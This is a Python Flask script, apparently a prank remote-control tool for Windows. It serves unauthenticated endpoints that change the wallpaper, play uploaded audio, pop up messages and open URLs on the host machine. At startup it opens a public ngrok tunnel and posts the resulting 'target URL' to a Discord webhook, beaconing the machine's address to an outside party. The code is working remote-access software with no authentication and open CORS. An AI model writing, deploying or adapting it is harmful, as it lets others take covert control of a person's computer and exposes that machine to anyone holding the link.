import os
import json
import threading
import webbrowser
import tempfile
import time
import ctypes
import requests
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)
CORS(app)

with open(os.path.join(BASE_DIR, 'config.json'), 'r', encoding='utf-8') as f:
    config = json.load(f)


# ── Actions ──────────────────────────────────────────────────────────────────

def _set_wallpaper(path):
    abs_path = os.path.abspath(path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)


def _play_audio(path):
    import pygame
    pygame.mixer.init()
    pygame.mixer.music.load(path)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        time.sleep(0.1)
    pygame.mixer.quit()
    try:
        os.unlink(path)
    except OSError:
        pass


def _show_popup(title, message):
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    root.wm_attributes('-topmost', True)
    messagebox.showinfo(title, message, parent=root)
    root.destroy()


# ── Routes ───────────────────────────────────────────────────────────────────

@app.route('/wallpaper', methods=['POST'])
def wallpaper():
    if 'image' not in request.files:
        return jsonify({'error': 'Champ "image" manquant'}), 400
    f = request.files['image']
    ext = os.path.splitext(f.filename)[1].lower() or '.jpg'
    # Keep wallpaper file persistent — Windows references it on screen refresh
    dest = os.path.join(BASE_DIR, f'wallpaper{ext}')
    f.save(dest)
    threading.Thread(target=_set_wallpaper, args=(dest,), daemon=True).start()
    return jsonify({'status': 'ok'})


@app.route('/audio', methods=['POST'])
def audio():
    if 'audio' not in request.files:
        return jsonify({'error': 'Champ "audio" manquant'}), 400
    f = request.files['audio']
    ext = os.path.splitext(f.filename)[1].lower() or '.mp3'
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=ext, dir=tempfile.gettempdir())
    f.save(tmp.name)
    tmp.close()
    threading.Thread(target=_play_audio, args=(tmp.name,), daemon=True).start()
    return jsonify({'status': 'ok'})


@app.route('/popup', methods=['POST'])
def popup():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({'error': 'JSON invalide'}), 400
    title = data.get('title', 'Message')
    message = data.get('message', '')
    threading.Thread(target=_show_popup, args=(title, message), daemon=True).start()
    return jsonify({'status': 'ok'})


@app.route('/url', methods=['POST'])
def open_url():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({'error': 'JSON invalide'}), 400
    url = data.get('url', '').strip()
    if not url:
        return jsonify({'error': 'URL manquante'}), 400
    threading.Thread(target=webbrowser.open, args=(url,), daemon=True).start()
    return jsonify({'status': 'ok'})


# ── Tunnel + Discord ─────────────────────────────────────────────────────────

def _send_discord(ngrok_url):
    webhook_url = config.get('webhook_url', '').strip()
    pseudo = config.get('pseudo', 'Inconnu')
    if not webhook_url:
        return
    try:
        requests.post(webhook_url, json={
            'content': (
                f'**{pseudo}** est en ligne !\n'
                f'URL cible : `{ngrok_url}`'
            )
        }, timeout=5)
    except Exception as e:
        print(f'[Discord] Erreur : {e}')


def _start_tunnel():
    from pyngrok import ngrok, conf as ngrok_conf
    authtoken = config.get('ngrok_authtoken', '').strip()
    if authtoken:
        ngrok_conf.get_default().auth_token = authtoken
    tunnel = ngrok.connect(9999, 'http')
    return tunnel.public_url


if __name__ == '__main__':
    try:
        print('[*] Démarrage du tunnel ngrok...')
        ngrok_url = _start_tunnel()
        print(f'[+] Tunnel actif : {ngrok_url}')
        _send_discord(ngrok_url)
    except Exception as e:
        print(f'[!] Ngrok indisponible : {e}')
        print('[!] Le serveur reste accessible en local sur le port 9999.')

    print('[*] Serveur Flask en écoute sur le port 9999...')
    app.run(host='0.0.0.0', port=9999, threaded=True)
